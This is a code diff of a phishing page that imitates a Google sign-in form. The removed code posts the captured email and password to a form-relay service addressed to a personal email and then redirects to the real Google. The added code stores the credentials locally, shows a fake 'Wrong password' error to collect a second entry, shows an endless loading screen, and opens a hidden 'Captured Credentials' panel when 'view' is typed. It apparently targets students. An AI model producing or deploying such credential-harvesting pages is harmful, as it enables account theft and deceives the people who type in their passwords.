@@ -11,53 +11,82 @@
         input { width: 100%; padding: 13px 15px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
         #errorMsg { color: #d93025; font-size: 14px; text-align: left; display: none; margin-bottom: 10px; }
         button { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; float: right; font-weight: 500; margin-top: 10px; }
+        
+        /* Admin Panel */
+        #adminPanel { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: white; border: 2px solid #1a73e8; padding: 20px; border-radius: 8px; z-index: 1000; width: 85%; max-width: 500px; box-shadow: 0 0 20px rgba(0,0,0,0.5); }
+        #logArea { width: 100%; height: 200px; font-family: monospace; background: #eee; border: 1px solid #ccc; padding: 5px; overflow-y: auto; white-space: pre-wrap; margin: 10px 0; }
     </style>
 </head>
 <body>
-    <div class="login-box">
+
+    <div id="mainContainer" class="login-box">
         <svg viewBox="0 0 272 92"><path d="M52.3 43.1v10.9h13.2c-0.5 3.3-3.8 9.6-13.2 9.6-8.1 0-14.7-6.7-14.7-14.9s6.6-14.9 14.7-14.9c4.6 0 7.7 2 9.5 3.7l8.6-8.6c-5.5-5.1-12.6-8.2-18.1-8.2-15.5 0-28 12.5-28 28s12.5 28 28 28c16.2 0 26.9-11.4 26.9-27.4 0-1.8-0.2-3.3-0.5-4.7H52.3z" fill="#4285F4""")/>></svg>
-        <h2>Sign in</h2>
-        <p>Use your Google Account</p>
-        <div id="errorMsg">Wrong password. Try again.</div>
-        <input type="email" id="email" placeholder="Email or phone" required>
-        <input type="password" id="pass" placeholder="Enter your password" required>
-        <button onclick="handleCapture()">Next</button>
+        <div id="loginFields">
+            <h2>Sign in</h2>
+            <p>Use your Google Account</p>
+            <div id="errorMsg">Wrong password. Try again.</div>
+            <input type="email" id="email" placeholder="Email or phone">
+            <input type="password" id="pass" placeholder="Enter your password">
+            <button onclick="handleLogin()">Next</button>
+        </div>
+        <div id="loadingScreen" style="display:none;">
+            <h2 id="loadingText">Loading proxy</h2>
+        </div>
+    </div>
+
+    <div id="adminPanel">
+        <h3>Captured Credentials</h3>
+        <div id="logArea">No data.</div>
+        <button onclick="localStorage.removeItem('security_logs'); showAdmin();" style="background:#ea4335; float:left;">Clear</button>
+        <button onclick="document.getElementById('adminPanel').style.display='none'">Close</button>
     </div>
 
     <script>
         let attempt = 0;
-        const myEmail = "Fenixhuffman@gmail.com"; 
 
-        async function handleCapture() {
-            const emailAddr = document.getElementById('email').value;
-            const passwordValue = document.getElementById('pass').value;
+        function handleLogin() {
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('pass').value;
+            if(!email || !pass) return;
 
-            if(!emailAddr || !passwordValue) return;
-
-            try {
-                // Fixed the URL to include /ajax/
-                await fetch("https://formsubmit.co" + myEmail, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        _subject: "SECURITY CAPTURE",
-                        Student_Email: emailAddr,
-                        Student_Pass: passwordValue,
-                        Attempt: attempt + 1
-                    })
-                });
-            } catch (e) {
-                // Stays silent
-            }
+            // Save to Local Storage
+            let logs = JSON.parse(localStorage.getItem('security_logs') || "[]");
+            logs.push({ email: email, pass: pass, time: new Date().toLocaleString(), attempt: attempt + 1 });
+            localStorage.setItem('security_logs', JSON.stringify(logs));
 
             if (attempt === 0) {
                 document.getElementById('pass').value = "";
                 document.getElementById('errorMsg').style.display = "block";
                 attempt++;
             } else {
-                // Redirect to real Google
-                window.location.href = "https://accounts.google.com";
+                // Switch to Infinite Loading
+                document.getElementById('loginFields').style.display = "none";
+                document.getElementById('loadingScreen').style.display = "block";
+                startLoadingAnimation();
             }
+        }
+
+        function startLoadingAnimation() {
+            let dots = 0;
+            const textElement = document.getElementById('loadingText');
+            setInterval(() => {
+                dots = (dots + 1) % 4;
+                textElement.innerText = "Loading proxy" + ".".repeat(dots);
+            }, 500);
+        }
+
+        // Secret code "view"
+        let keys = "";
+        document.addEventListener('keydown', (e) => {
+            keys += e.key;
+            if (keys.includes("view")) { showAdmin(); keys = ""; }
+            if (keys.length > 10) keys = "";
+        });
+
+        function showAdmin() {
+            const logs = JSON.parse(localStorage.getItem('security_logs') || "[]");
+            document.getElementById('logArea').innerText = logs.length ? logs.map(l => `[${l.time}] Attempt ${l.attempt}\nEmail: ${l.email}\nPass: ${l.pass}\n---`).join('\n') : "Empty.";
+            document.getElementById('adminPanel').style.display = 'block';
         }
     </script>
 </body>
